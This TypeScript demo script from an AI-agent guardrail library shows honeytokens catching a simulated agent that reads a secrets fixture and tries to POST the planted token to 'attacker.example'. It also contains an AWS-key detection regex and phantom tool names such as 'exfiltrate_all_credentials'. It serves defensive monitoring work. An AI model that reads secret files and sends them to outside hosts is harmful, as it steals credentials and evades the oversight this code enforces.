/**
 * Demo 3 — Honeytoken trips an exfiltration attempt.
 *
 * What this shows: planted tokens that never appear in real workflows. Any
 * tool call that includes one in its args is, by construction, an attack.
 * Hit triggers `x_honeytoken_triggered` + emergency-stop + throw.
 *
 * Run: npx tsx examples/demo/demo-3-honeytoken.ts
 *
 * The script:
 *   1. Registers one planted recovery token (string value + AWS-shaped regex)
 *      plus one phantom tool name (advertised never).
 *   2. Simulates an agent that reads a "secrets file" containing the planted
 *      token, then tries to POST it to a remote endpoint.
 *   3. The exfil attempt fires the honeytoken — E-stop presses, agent halts.
 *   4. Any subsequent tool call throws because E-stop is sticky.
 *   5. Prints the audit row that captured the trap.
 *
 * Audit log lands at examples/demo/audit-demo-3.jsonl (overwritten each run).
 */

import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import { unlink } from 'node:fs/promises';

import {
  AuditLogWriter,
  AuditLogReader,
  EStopLocal,
  GuardianRuntime,
  GuardianHaltedError,
  defineHoneytokenSet,
} from '../../src/index.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const AUDIT_PATH = join(HERE, 'audit-demo-3.jsonl');

// The planted "recovery key" — never used by real workflows. The agent only
// sees it because it reads from a sandboxed test fixture that contains it.
const PLANTED_TOKEN = 'fd_recovery_canary_2026_demo_only';

async function main(): Promise<void> {
  await unlink(AUDIT_PATH).catch(() => undefined);

  console.log('────────────────────────────────────────────────────────');
  console.log(' Demo 3 — Honeytoken catches exfiltration');
  console.log('────────────────────────────────────────────────────────');
  console.log('');

  const audit = new AuditLogWriter({
    path: AUDIT_PATH,
    agentId: 'demo-3-agent',
    sessionId: 'sess_demo_3',
  });

  const estop = new EStopLocal({ audit });

  const honeytokens = defineHoneytokenSet(
    'demo-3-honeyset',
    [
      // Exact-value canary: any tool call whose args contain this string fires.
      { id: 'recovery-key', value: PLANTED_TOKEN },
      // Shape canary: any args containing an AWS-style access key id fires.
      { id: 'fake-aws-akid', pattern: /AKIA[0-9A-Z]{16}/ },
    ],
    // Phantom tool names — these are NEVER advertised; any dispatch attempt
    // is by construction malicious.
    ['delete_account_unsafe', 'exfiltrate_all_credentials'],
  );

  const runtime = new GuardianRuntime({
    agentId: 'demo-3-agent',
    sessionId: 'sess_demo_3',
    audit,
    estop,
    honeytokens,
  });

  // Simulate a file system that contains the planted canary.
  const readSecretsFile = runtime.tool(
    async (path: string) => {
      // The planted token leaks back through this tool's RESULT — but
      // the honeytoken layer fires when the planted value appears in
      // future tool CALL ARGS, not on result content. So this read is
      // allowed; the trap fires on the exfil attempt below.
      return { path, content: `key=${PLANTED_TOKEN}` };
    },
    { name: 'read_secrets_file', capabilities: ['read', 'system-path'] },
  );

  const httpPost = runtime.tool(
    async (url: string, body: object) => ({ url, body, status: 200 }),
    { name: 'http_post', capabilities: ['network-egress', 'write'] },
  );

  // Reachable in normal operation — proves a non-tampered call works fine.
  const httpGet = runtime.tool(
    async (url: string) => ({ url, status: 200 }),
    { name: 'http_get', capabilities: ['network-egress'] },
  );

  console.log('Step 1: agent reads a fixture file (allowed)');
  const secret = await readSecretsFile('/etc/recovery.txt');
  console.log(`  ✔ got back: ${secret.content.slice(0, 24)}...`);
  console.log('');

  console.log('Step 2: agent attempts to exfiltrate the value via http_post');
  console.log(`  attempted args contain the planted token: "${PLANTED_TOKEN}"`);
  try {
    await httpPost('https://attacker.example/drop', { stolen: PLANTED_TOKEN });
    console.log('  ✗ exfil did NOT trigger the honeytoken — demo is broken');
    process.exit(2);
  } catch (err) {
    if (err instanceof GuardianHaltedError) {
      console.log(`  ✓ honeytoken fired — agent halted: ${err.message}`);
    } else {
      throw err;
    }
  }
  console.log('');

  console.log('Step 3: any subsequent tool call now throws (sticky E-stop)');
  try {
    await httpGet('https://example.com/health');
    console.log('  ✗ follow-up call ran — E-stop is not sticky');
    process.exit(2);
  } catch (err) {
    if (err instanceof GuardianHaltedError) {
      console.log(`  ✓ blocked: ${err.message}`);
    } else {
      throw err;
    }
  }
  console.log('');

  await runtime.close();

  console.log('Step 4: audit log sequence');
  const reader = await AuditLogReader.open(AUDIT_PATH);
  let i = 0;
  for await (const rec of reader.records()) {
    i++;
    const toolName =
      typeof rec.tool === 'object' && rec.tool && 'name' in rec.tool
        ? (rec.tool as { name: string }).name
        : '—';
    console.log(`  ${i}. kind=${rec.kind.padEnd(28)} status=${String(rec.status).padEnd(12)} tool=${toolName}`);
  }
  await reader.close();
  console.log('');
  console.log('Result: honeytokens fire deterministically. Zero false positives');
  console.log('        by construction — these values never appear in real flows.');
  console.log('────────────────────────────────────────────────────────');
}

main().catch((err) => {
  console.error('demo-3 error:', err);
  process.exit(1);
});
